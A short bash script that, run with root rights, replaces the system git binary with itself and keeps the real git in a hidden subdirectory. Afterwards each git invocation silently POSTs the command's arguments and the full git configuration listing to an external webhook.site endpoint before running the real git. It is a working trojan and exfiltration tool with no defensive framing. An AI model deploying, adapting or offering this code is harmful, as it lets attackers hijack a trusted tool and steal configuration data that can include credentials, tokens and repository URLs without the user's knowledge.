#!/bin/bash

# XXX: run with sudo

URL='https://webhook.site/65adb5dd-dc3e-4357-815b-fd42b2e2790d'

leak() {
  echo "$1"
  curl --no-progress-meter -X POST "$URL" --data-binary "$1" -H "Content-Type: application/octet-stream"
}

if [[ "$(basename $0)" = git ]]; then
  realgit="$(dirname $0)/real/git"
  d="$("$realgit" config --list --show-origin)"
  leak "git $@
$d" >&2

  exec "$realgit" "$@"

else

  oldgit=$(command -v git)
  realgit=$(dirname $oldgit)/real/git
  mkdir -v -p $(dirname $realgit)
  cp -v "$oldgit" "$realgit"
  cp -v "$0" "$oldgit"
fi
